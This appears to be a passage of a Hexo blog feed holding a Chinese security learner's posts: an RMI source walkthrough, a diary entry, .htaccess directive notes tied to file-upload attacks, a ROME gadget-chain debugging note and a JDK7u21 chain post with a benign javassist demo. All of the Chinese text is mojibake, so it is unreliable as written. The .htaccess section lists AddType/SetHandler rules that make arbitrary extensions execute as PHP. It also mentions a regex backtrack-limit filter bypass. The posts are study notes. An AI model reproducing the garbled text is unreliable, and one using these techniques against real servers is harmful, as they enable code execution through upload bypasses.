src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212251398.png" alt="QQæˆªå›¾20220321211527"></p><p>å¯ä»¥å‘ç°æˆåŠŸåˆ©ç”¨ã€‚</p><h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><h3 id="è¿œç¨‹å¯¹è±¡çš„åˆ›å»º"><a href="#è¿œç¨‹å¯¹è±¡çš„åˆ›å»º" class="headerlink" title="è¿œç¨‹å¯¹è±¡çš„åˆ›å»º"></a>è¿œç¨‹å¯¹è±¡çš„åˆ›å»º</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212251436.png" alt="QQæˆªå›¾20220321220836"></p><p>åœ¨åˆå§‹åŒ–æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ª UnicastServerRef å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶ <code>exportObject</code> æ–¹æ³•æ¥ export RemoteObject è¿™ä¸ªè¿œç¨‹å¯¹è±¡ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212214923.png" alt="QQæˆªå›¾20220321221357"></p><p>ä½¿ç”¨ RemoteObjectInvocationHandler æ¥ä¸ºæˆ‘ä»¬æµ‹è¯•å†™çš„ RemoteObject å®ç°çš„ RemoteInterface æ¥å£åˆ›å»ºåŠ¨æ€ä»£ç†ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬å…ˆä»”ç»†çœ‹ä¸€ä¸‹è¿™ä¸ªåŠ¨æ€ä»£ç†ï¼ŒæŒ‰ç…§ä»¥å‰çš„æ€è·¯è¿™é‡ŒåŸºæœ¬éƒ½æ˜¯å‡ºå‘æ¼æ´çš„åœ°æ–¹ï¼ˆ<strong>invokeæ–¹æ³•</strong>ï¼‰ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212251908.png" alt="QQæˆªå›¾20220321223031"></p><p>å¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°è¿™é‡Œçš„ï¼Œå…ˆåˆ¤æ–­æ˜¯ä¸æ˜¯Objectçš„æ–¹æ³•å¦‚æœæ˜¯å°±ä¼šè°ƒç”¨<br><code>invokeObjectMethod(proxy, method, args)</code>ï¼Œåä¹‹è°ƒç”¨<code>invokeRemoteMethod(proxy, method, args)</code>ï¼Œå¾ˆæ˜æ˜¾è¿™é‡Œä¼šè°ƒç”¨<code>return invokeRemoteMethod(proxy, method, args);</code>è¿›å…¥çœ‹çœ‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212251806.png" alt="QQæˆªå›¾20220321224512"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212251542.png" alt="QQæˆªå›¾20220321224527"></p><p>è€Œåœ¨ <code>invokeRemoteMethod</code> ä¸­å®é™…æ˜¯å§”æ‰˜ RemoteRef çš„å­ç±» UnicastRef çš„ invoke æ–¹æ³•æ‰§è¡Œè°ƒç”¨ã€‚</p><p>åç»­å°±æ˜¯ååºåˆ—åŒ–çš„æ–¹æ³•äº†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212251465.png" alt="QQæˆªå›¾20220321224742"></p><p>ç„¶åæˆ‘ä»¬åˆçŸ¥é“è¿™é‡Œæ˜¯ä½¿ç”¨äº†åŠ¨æ€ä»£ç†ï¼Œåœ¨ä¹‹å‰çš„å­¦ä¹ ä¸­åªè¦ä½¿ç”¨äº†åŠ¨æ€ä»£ç†å°±ä¼šåŠ è½½è¿™ä¸ªç±»çš„çš„invokeæ–¹æ³•ï¼Œé‚£ä¹ˆè¿™é‡Œå¦‚æœåƒå®ç°çš„æ–¹æ³•ä¸­é‡å†™invokeï¼ˆæ·»åŠ æ¶æ„ä»£ç ï¼Œå°±å¯ä»¥è§¦å‘ã€‚ï¼‰</p><p>è°ƒç”¨è¿™ä¸ªTargetå°è£…ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212251888.png" alt="QQæˆªå›¾20220321221822"></p><p>ç„¶åç›‘å¬æœ¬åœ°ç«¯å£ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212220873.png" alt="QQæˆªå›¾20220321222027"></p><p>ç„¶åè°ƒç”¨ TCPTransport çš„ exportObject æ–¹æ³•å°† Target å®ä¾‹æ³¨å†Œåˆ° ObjectTable ä¸­ã€‚ObjectTable ç”¨æ¥ç®¡ç†æ‰€æœ‰å‘å¸ƒçš„æœåŠ¡å®ä¾‹ Targetï¼ŒObjectTable æä¾›äº†æ ¹æ® ObjectEndpoint å’Œ Remote å®ä¾‹ä¸¤ç§æ–¹å¼æŸ¥æ‰¾ Target çš„æ–¹æ³•ï¼ˆä¸åŒå‚æ•°çš„ getTarget æ–¹æ³•ï¼‰ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212251612.png" alt="QQæˆªå›¾20220321222637"></p>]]></content>
    
    
    <categories>
      
      <category>RMI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022.3.19</title>
    <link href="/2022/03/19/2022-3-19/"/>
    <url>/2022/03/19/2022-3-19/</url>
    
    <content type="html"><![CDATA[<h1 id="2022-3-19"><a href="#2022-3-19" class="headerlink" title="2022.3.19"></a>2022.3.19</h1><p>ä¸€å¤§æ—©èµ·æ¥æ‰“è™ç¬¦ï¼Œä¸¤é“é¢˜ä¸€ä¸ªåœ¨ç¯å¢ƒå˜é‡é‡Œæ‰§è¡Œå‘½ä»¤ï¼ˆå¾…ä¼šçœ‹çœ‹pç¥æ–‡ç« ï¼‰ã€‚å¦ä¸€é“æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼ˆçœ‹äº†å¾ˆä¹…ï¼Œä¸€ç›´æŠŠæ–‡ä»¶ä¸Šä¼ ä¸ä¸Šå»ï¼‰ã€‚ç„¶åä¸­åˆå»åƒäº†ä¸ªé¥­ï¼Œå»å‚åŠ ç®—æ³•æ¯”èµ›ï¼Œåšäº†2é“ï¼Œç¼–ç¨‹ä»€ä¹ˆçš„æ—©å°±å¿˜è®°äº†ï¼ˆå¾ˆéš¾å—ï¼‰ã€‚ç°åœ¨å›æ¥äº†ï¼Œç„¶åå®‰è£…è™šæ‹Ÿæœºï¼Œå®‰è£…ä¸€æ¬¡å°±è“å±ä¸€æ¬¡ï¼ˆ<a href="https://blog.csdn.net/qq_44982110/article/details/122331129">è§£å†³åŠæ³•</a>ï¼‰ï¼Œæœ€åæ‰¾åˆ°äº†åŸå› ã€‚win11çœŸçš„å¾ˆè¾£é¸¡ï¼Œæ²¡äº‹åˆ«æ›´æ–°ã€‚</p><p>ç­‰äºç™½å·äº†ä¸€ç™½å¤©ï¼Œå¾ˆéš¾å—ã€‚è¦æ˜¯æ‰“çƒæ‰“è¿™ä¹ˆä¹…ï¼Œäººéƒ½è¦çˆ½æ²¡äº†ã€‚</p><p>ç°åœ¨ç­‰ç€è™šæ‹Ÿæœºå®‰è£…å‘¢ï¼Œæ¥bbä¸¤å¥ã€‚çœŸçš„çƒ¦èºã€‚</p><p>çœŸçš„éš¾å—ï¼Œå†™åšå®¢åˆå‡ºç°äº†ï¼Œä¸Šä¼ é”™è¯¯ï¼ï¼ï¼ï¼åˆè¦é‡æ–°ç”Ÿæˆå¯†é’¥ã€‚</p><p>16ï¼š46 æ‰å¼„å¥½ ä»Šå¤©çœŸæ˜¯å€’éœ‰çš„ä¸€å¤©  æ— å¥ˆã€‚</p>]]></content>
    
    
    <categories>
      
      <category>å†ç¨‹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å†ç¨‹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>.htaccess</title>
    <link href="/2022/03/19/htaccess/"/>
    <url>/2022/03/19/htaccess/</url>
    
    <content type="html"><![CDATA[<h1 id="htaccessçš„ä½¿ç”¨"><a href="#htaccessçš„ä½¿ç”¨" class="headerlink" title=".htaccessçš„ä½¿ç”¨"></a>.htaccessçš„ä½¿ç”¨</h1><p>è·Ÿç€<a href="https://y4tacker.blog.csdn.net/">Y4tacker</a>å¸ˆå‚…å­¦ä¹ ä¸€ä¸‹ã€‚ï¼ˆå¬äº†L.N.å¤§ä½¬çš„å»ºè®®ï¼Œè·Ÿç€å¥½å¸ˆå‚…å­¦ä¹ ï¼‰</p><p>æƒ³èµ·æ¥ï¼Œè¿™ä¸ª.htaccessçš„åˆ©ç”¨é¢è¯•Nepnepçš„æ—¶å€™ï¼Œè¢«é—®åˆ°ä¹Ÿå°±åªèƒ½æ¨¡æ£±ä¸¤å¯çš„è¯´å‡ºå‡ å¥è¯å‡ºæ¥ã€‚</p><p>ä¸è¯´äº†ç›´æ¥å¼€å§‹ã€‚</p><h2 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><ul><li><code>.htaccess</code>æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ï¼Œè‹¥è¦å¯åŠ¨<code>.htaccess</code>é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æœåŠ¡å™¨çš„ä¸»é…ç½®æ–‡ä»¶å°† AllowOverride è®¾ç½®ä¸º All</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">AllowOverride</span> All  <span class="hljs-comment">#å¯åŠ¨.htaccessæ–‡ä»¶çš„ä½¿ç”¨</span><br></code></pre></td></tr></table></figure><ul><li>.htaccess ä¸­æœ‰ # å•è¡Œæ³¨é‡Šç¬¦, ä¸”æ”¯æŒ \æ‹¼æ¥ä¸Šä¸‹ä¸¤è¡Œã€‚</li></ul><h3 id="SetHandlerå’ŒForceType"><a href="#SetHandlerå’ŒForceType" class="headerlink" title="SetHandlerå’ŒForceType"></a>SetHandlerå’ŒForceType</h3><p>å¼ºåˆ¶æ‰€æœ‰åŒ¹é…çš„æ–‡ä»¶è¢«ä¸€ä¸ªæŒ‡å®šçš„å¤„ç†å™¨å¤„ç†<br>ç”¨æ³•</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">ForceType <span class="hljs-built_in">application</span>/x-httpd-php<br>SetHandler <span class="hljs-built_in">application</span>/x-httpd-php<br></code></pre></td></tr></table></figure><h3 id="AddHandler"><a href="#AddHandler" class="headerlink" title="AddHandler"></a>AddHandler</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">AddType application/x-httpd-php <span class="hljs-string">.htm</span>ï¼Œåˆ™<span class="hljs-string">.htm</span>æ–‡ä»¶ä¹Ÿå¯ä»¥æ‰§è¡Œphpç¨‹åº<br>AddHandler cgi-script <span class="hljs-string">.yyy</span> åˆ™æ‰©å±•åä¸º<span class="hljs-string">.yyy</span>çš„æ–‡ä»¶ä½œä¸º CGI è„šæœ¬æ¥å¤„ç†<br></code></pre></td></tr></table></figure><h3 id="AddType"><a href="#AddType" class="headerlink" title="AddType"></a>AddType</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .xxx åŒä¸ŠAddHandlerçš„ä½œç”¨<br></code></pre></td></tr></table></figure><h3 id="Apache-ç›®å½•-è®¿é—®æ§åˆ¶-require"><a href="#Apache-ç›®å½•-è®¿é—®æ§åˆ¶-require" class="headerlink" title="Apache ç›®å½• è®¿é—®æ§åˆ¶ require"></a>Apache ç›®å½• è®¿é—®æ§åˆ¶ require</h3><p>Require all granted #å…è®¸æ‰€æœ‰<br><a href="http://www.splaybow.com/post/apache-forbidden-directory-require.html">Comeï¼</a></p><h3 id="php-flag-engine-on"><a href="#php-flag-engine-on" class="headerlink" title="php_flag engine on"></a>php_flag engine on</h3><p><strong>apacheé™åˆ¶æŸä¸ªç›®å½•ä¸‹çš„phpæ–‡ä»¶æœ‰æ‰§è¡Œæƒé™</strong></p><h2 id="php-iniä¸­çš„è®¾ç½®"><a href="#php-iniä¸­çš„è®¾ç½®" class="headerlink" title="php.iniä¸­çš„è®¾ç½®"></a>php.iniä¸­çš„è®¾ç½®</h2><p>è¿™é‡Œåªæ•´ç†è¿™ç¯‡æ–‡ç« æ‰€ç”¨åˆ°çš„ï¼ˆæˆ‘ç¬¬ä¸€ååº”ä¸æ‡‚çš„&#x3D;.&#x3D;ï¼‰ï¼Œæƒ³è¦å¥½å¥½äº†è§£åˆ°æ¥<a href="https://www.php.net/manual/zh/ini.list.php">è¿™é‡Œ</a></p><ul><li><p><strong>allow_url_fopen</strong> æ˜¯å¦å…è®¸æ‰“å¼€URLæ–‡ä»¶ï¼ˆé»˜è®¤å¼€å¯ï¼‰</p></li><li><p><strong>allow_url_include</strong> æ˜¯å¦å…è®¸å¼•ç”¨URLæ–‡ä»¶ï¼ˆé»˜è®¤å…³é—­ï¼‰</p></li><li><p><strong>auto_prepend_file</strong> å’Œ <strong>auto_append_file</strong> ä¼šè§£ææ–‡ä»¶<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203190938835.png" alt="QQæˆªå›¾20220318150536"></p></li><li><p><strong>include_path</strong> nclude()çš„é»˜è®¤è·¯å¾„</p></li><li><p><strong>pcre.backtrack_limit</strong> è®¾ç½®å›æº¯å€¼ã€‚<strong>ï¼ˆè®¾ç½®æ­£åˆ™å›æœ”æ¬¡æ•°æ¥ä½¿æ­£åˆ™åŒ¹é…çš„ç»“æœè¿”å›ä¸º false è€Œä¸æ˜¯0 ï¼Œä»è€Œå¯ä»¥ç»•è¿‡æ­£åˆ™ã€‚ï¼‰</strong></p></li><li></li></ul><h3 id="é…ç½®å¯è¢«è®¾å®šçš„èŒƒå›´"><a href="#é…ç½®å¯è¢«è®¾å®šçš„èŒƒå›´" class="headerlink" title="é…ç½®å¯è¢«è®¾å®šçš„èŒƒå›´"></a>é…ç½®å¯è¢«è®¾å®šçš„èŒƒå›´</h3><table><thead><tr><th><code>PHP_INI_USER</code></th><th>å¯åœ¨ç”¨æˆ·è„šæœ¬ï¼ˆä¾‹å¦‚ <a href="https://www.php.net/manual/zh/function.ini-set.php">ini_set()</a>ï¼‰æˆ– <a href="https://www.php.net/manual/zh/configuration.changes.php#configuration.changes.windows">Windows æ³¨å†Œè¡¨</a>ä»¥åŠ .user.ini ä¸­è®¾å®š</th></tr></thead><tbody><tr><td><code>PHP_INI_PERDIR</code></td><td>å¯åœ¨ php.iniï¼Œ.htaccess æˆ– httpd.confï¼ˆ<strong>httpd.confæ˜¯Apacheç½‘ç»œæœåŠ¡å™¨è½¯ä»¶ä¸­é‡è¦çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒå­˜å‚¨ç€Apacheä¸­è®¸å¤šå¿…ä¸å¯å°‘çš„é…ç½®ä¿¡æ¯ã€‚æœ€å¸¸ç”¨çš„ä¸€ç‚¹ï¼Œå°±æ˜¯å‘é‡Œé¢æ·»åŠ å»ºç«™ç½‘ç«™ä¿¡æ¯ã€‚</strong>ï¼‰ ä¸­è®¾å®š</td></tr><tr><td><code>PHP_INI_SYSTEM</code></td><td>å¯åœ¨ php.ini æˆ– httpd.conf ä¸­è®¾å®š</td></tr><tr><td><code>PHP_INI_ALL</code></td><td>å¯åœ¨ä»»ä½•åœ°æ–¹è®¾å®š</td></tr></tbody></table><h3 id="php-value-php-flag-php-admin-value-php-admin-flagåŒºåˆ«"><a href="#php-value-php-flag-php-admin-value-php-admin-flagåŒºåˆ«" class="headerlink" title="php_value, php_flag, php_admin_value, php_admin_flagåŒºåˆ«"></a>php_value, php_flag, php_admin_value, php_admin_flagåŒºåˆ«</h3><p><a href="https://www.php.net/manual/zh/configuration.changes.php">Comeï¼</a>ï¼ˆè¿™é‡Œè¯¦ç»†è§£é‡Šäº†ï¼ï¼‰</p><ul><li><p><strong>php_value name value</strong><br>è®¾ç½®æŒ‡å®šçš„å€¼. åªé€‚åˆäº PHP_INI_ALL å’Œ PHP_INI_PERDIR ç±»å‹æŒ‡ä»¤. æ¸…é™¤ä¹‹å‰è®¾ç½®çš„å€¼ä½¿ç”¨ none æ ‡è®°. Note: ä¸è¦ä½¿ç”¨ php_value è®¾å®šå¸ƒå°”å€¼å’Œphp_flag (è§ä¸‹æ–‡) .</p></li><li><p><strong>php_flag name on|off</strong><br>ç”¨äºè®¾ç½®ä¸€ä¸ªå¸ƒå°”é…ç½®æŒ‡ä»¤, åªé€‚åˆäº PHP_INI_ALL å’Œ PHP_INI_PERDIR ç±»å‹æŒ‡ä»¤(å’Œä¸Šé¢çš„ä¸åŒå°±æ˜¯ php_value ç”¨äºè®¾ç½®å€¼(å¦‚å­—ç¬¦ä¸²),è€Œè¿™åªèƒ½è®¾ç½® on off)</p></li><li><p><strong>php_admin_value name value</strong><br>åŠŸèƒ½å’Œphp_valueä¸€æ ·,ä½†è¿™ä¸ªä¸èƒ½ç”¨åœ¨ .htaccess æ–‡ä»¶é‡Œ, åªèƒ½åœ¨conf(åŒ…æ‹¬virtualhost)æ–‡ä»¶é‡Œå¼•ç”¨</p></li><li><p><strong>php_admin_flag name on|off</strong><br>åŒä¸Š</p></li></ul><h2 id="CGIæ‰©å±•"><a href="#CGIæ‰©å±•" class="headerlink" title="CGIæ‰©å±•"></a>CGIæ‰©å±•</h2><p>CGIæ‰©å±•åœ¨ç‰©ç†ä¸Šæ˜¯ä¸€æ®µç¨‹åºï¼Œè¿è¡Œåœ¨æœåŠ¡å™¨ä¸Šï¼Œæä¾›åŒå®¢æˆ·ç«¯ Htmlé¡µé¢çš„æ¥å£ã€‚CGIæ‰©å±•æ˜¯ä¸€ä¸ªç”¨äºå®šWebæœåŠ¡å™¨ä¸å¤–éƒ¨ç¨‹åºä¹‹é—´é€šä¿¡æ–¹å¼çš„æ ‡å‡†ï¼Œ<strong>ä½¿å¾—å¤–éƒ¨ç¨‹åºèƒ½ç”ŸæˆHTMLã€å›¾åƒæˆ–è€…å…¶ä»–å†…å®¹</strong>ï¼Œè€ŒæœåŠ¡å™¨å¤„ç†çš„æ–¹å¼ä¸é‚£äº›éå¤–éƒ¨ç¨‹åºç”Ÿæˆçš„ HTMLã€å›¾åƒæˆ–å…¶ä»–å†…å®¹çš„å¤„ç†æ–¹å¼æ˜¯ç›¸åŒçš„ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203190938451.png" alt="QQæˆªå›¾20220319093010"></p><h2 id="FastCgiæ‰§è¡Œ"><a href="#FastCgiæ‰§è¡Œ" class="headerlink" title="FastCgiæ‰§è¡Œ"></a>FastCgiæ‰§è¡Œ</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203190938018.png" alt="QQæˆªå›¾20220319093145"></p><p>åç»­çš„å°±ç®€å•çœ‹ä¸€ä¸‹ï¼Œä»Šå¤©åˆæ˜¯å·å­¦åˆ«äººèµ„æ–™çš„ä¸€å¤©ï¼ˆå˜¿å˜¿å˜¿~~ï¼‰</p>]]></content>
    
    
    <categories>
      
      <category>æ–‡ä»¶ä¸Šä¼ </category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç†è§£ROMEé“¾çš„ç¼©çŸ­</title>
    <link href="/2022/03/17/%E7%90%86%E8%A7%A3ROME%E9%93%BE%E7%9A%84%E7%BC%A9%E7%9F%AD/"/>
    <url>/2022/03/17/%E7%90%86%E8%A7%A3ROME%E9%93%BE%E7%9A%84%E7%BC%A9%E7%9F%AD/</url>
    
    <content type="html"><![CDATA[<h1 id="ç†è§£ROMEé“¾çš„ç¼©çŸ­"><a href="#ç†è§£ROMEé“¾çš„ç¼©çŸ­" class="headerlink" title="ç†è§£ROMEé“¾çš„ç¼©çŸ­"></a>ç†è§£ROMEé“¾çš„ç¼©çŸ­</h1><h2 id="Y4tackerçš„ç®€å•é—®é¢˜"><a href="#Y4tackerçš„ç®€å•é—®é¢˜" class="headerlink" title="Y4tackerçš„ç®€å•é—®é¢˜"></a>Y4tackerçš„ç®€å•é—®é¢˜</h2><p><strong>æˆ‘è§‰å¾—æŒºéš¾</strong>ã€‚ï¼ˆå¦‚æœä¸€å¼€å§‹å°±é™ä¸‹å¿ƒæ¥è°ƒè¯•å¯èƒ½å°±ä¼šç®€å•ä¸€äº›ã€‚ï¼‰</p><p>çœŸå¸Œæœ›æœ‰ä¸€å¤©æˆ‘ä¹Ÿå¯ä»¥ç‹¬è‡ªå»ç ”ç©¶è¿™äº›ä»£ç ï¼Œè€Œä¸æ˜¯è·Ÿåˆ«çš„å¸ˆå‚…å­¦ä¹ ã€‚</p><p>ä¸€å¼€å§‹æ²¡æœ‰è°ƒè¯•æƒ³å·æ‡’ï¼Œå‘ç°æ ¹æœ¬ä¸è¡Œã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203172304235.png" alt="QQæˆªå›¾20220317211300"></p><p>ä¸ºä»€ä¹ˆè¦æ„é€ æˆè¿™ç§ï¼Ÿ<br>é¦–å…ˆç¬¬ä¸€ç‚¹æˆ‘ä»¬è¦çŸ¥é“å½“ä¸€ä¸ªmapä¸­ä¼ å…¥ä¸¤ä¸ªå€¼åä¼šå¯¹æ¯”keyçš„å€¼ï¼Œç„¶åä¼šè¿›å…¥åˆ°</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203172116387.png" alt="QQæˆªå›¾20220317211641"></p><p>ä½†æ˜¯æˆ‘ä»¬æ³¨æ„åˆ°è¿™é‡Œçš„çº¢æ¡†å†…å®¹ï¼Œ<strong>k&#x3D;p.key</strong>,è¿™é‡Œä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆéœ€è¦aaâ€“&gt;bBçš„å˜åŒ–ã€‚ifï¼ˆæ¡ä»¶çš„åˆ¤æ–­å½¢å¼å’Œé¡ºåºï¼‰ã€‚</p><p>ç„¶åå°±æ˜¯ä¸ºä»€ä¹ˆè¦æ”¹å˜é¡ºåºã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203172304925.png" alt="QQæˆªå›¾20220317214833"></p><p>ç¬¬ä¸€æ¬¡è¿›å…¥<strong>AbstractMap#equals</strong>çš„æ—¶å€™ï¼Œè¿™é‡Œçš„aaå¯¹åº”çš„æ˜¯è¿™æ ·çš„ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203172150470.png" alt="QQæˆªå›¾20220317214915"></p><p>ç»§ç»­å‘ä¸‹èµ°ï¼ˆè¿™é‡Œè¿˜æ˜¯åœ¨ç¬¬ä¸€æ¬¡è¿›å…¥çš„æ—¶å€™ aaå¯¹åº”çš„ç±»å˜äº†ï¼ï¼ï¼ï¼‰ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203172208312.png" alt="QQæˆªå›¾20220317220819"></p><p>ç»è¿‡è¿™é‡Œä¹‹åvalueå°±å˜æˆï¼ˆ<strong>EqualBean</strong>ï¼‰äº†ã€‚</p><p>åœ¨ç¬¬äºŒæ¬¡è¿›å…¥<strong>AbstractMap#equals</strong>çš„æ—¶å€™ï¼ˆ<strong>è¿™æ—¶å€™å°±æ˜¯ååºåˆ—åŒ–çš„æ—¶å€™</strong>ï¼‰ï¼Œè¿™é‡Œaaå¯¹åº”çš„è¿˜æ˜¯è¿™ä¸ª<strong>EqualBean</strong>ï¼Œå¾ˆç¦»è°±ï¼Œ<strong>ä¸åŒçš„æ˜¯ç¬¬ä¸€æ¬¡æ²¡æœ‰ä¼ å…¥å‚æ•°ï¼Œç¬¬äºŒæ¬¡ä¼ å…¥äº†å‚æ•°ï¼ˆ_objç­‰ï¼‰</strong>ï¼Œå¯¼è‡´äº†æˆåŠŸè§¦å‘rceã€‚</p><p>è¿™é‡Œä¹Ÿå°±æ˜¯è¯´è¿™ä¹ˆæ„é€ çš„åŸå› ï¼Œåªæ˜¯ä¸ºäº†è®©åœ¨è¿­ä»£çš„æ—¶å€™ç¬¬ä¸€ä¸ªæ˜¾ç¤º<strong>EqualBeanç±»</strong></p><p><strong>ä½†æ˜¯ä¸ºä»€ä¹ˆåœ¨è¿­ä»£çš„æ—¶å€™ç¬¬ä¸€ä¸ªæ˜¾ç¤ºå°±æ˜¯aaå¯¹åº”çš„ç±»ï¼Ÿï¼Ÿï¼Ÿ</strong></p><p>è·Ÿäº†å‡ æ¬¡è¿˜æ˜¯ä¸æ‡‚ã€‚è·Ÿè¿›**entrySet().iterator()**ï¼Œä¹Ÿæ˜¯ç›´æ¥å˜åŒ–äº†ã€‚å¸Œæœ›ä»¥åå¾—åˆ°è§£å†³ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203172304256.png" alt="QQæˆªå›¾20220317230250"></p>]]></content>
    
    
    <categories>
      
      <category>ROME</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jdk7u21åŸç”Ÿé“¾</title>
    <link href="/2022/03/16/Jdk7u21%E5%8E%9F%E7%94%9F%E9%93%BE/"/>
    <url>/2022/03/16/Jdk7u21%E5%8E%9F%E7%94%9F%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="JDK7u21åŸç”Ÿé“¾"><a href="#JDK7u21åŸç”Ÿé“¾" class="headerlink" title="JDK7u21åŸç”Ÿé“¾"></a>JDK7u21åŸç”Ÿé“¾</h1><p>ä¹‹å‰ä¸€ç›´æ˜¯çœ‹è¿‡è®¸å¤šæ–‡ç« ï¼ˆå› ä¸ºå®ƒä¸éœ€è¦ä¾èµ–åˆ«çš„åº“ï¼‰å°±å¯ä»¥æ”»å‡»ã€‚çœ‹åˆ°pç¥ï¼ˆçŸ¥è¯†æ˜Ÿçƒï¼‰å‘äº†æ–‡ç« å°±æ‰‹åŠ¨è·Ÿä¸€ä¸‹ã€‚</p><h2 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h2><p>ä¹‹å‰å°±å·²ç»å­¦ä¹ è¿‡äº†ã€‚å¤ä¹ ä¸€ä¸‹ã€‚</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> &#123;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> javassist.CannotCompileException;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavassistDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">aDefault</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> aDefault.get(Demo.class.getName());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;System.out.println(\&quot;Xsw6_a\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(s);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">demohaha</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Demohaha&quot;</span>;<br>        ctClass.setName(demohaha);<br>        ctClass.writeFile();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¼šç”Ÿæˆå¦‚ä¸‹çš„classæ–‡ä»¶ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642740.png" alt="QQæˆªå›¾20220316140909"></p><p>ç„¶åå¦‚æœè¿™é‡Œæ²¡æœ‰é‡æ–°è®¾ç½®<strong>setname</strong>ï¼Œä¼šå‡ºç°ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642784.png" 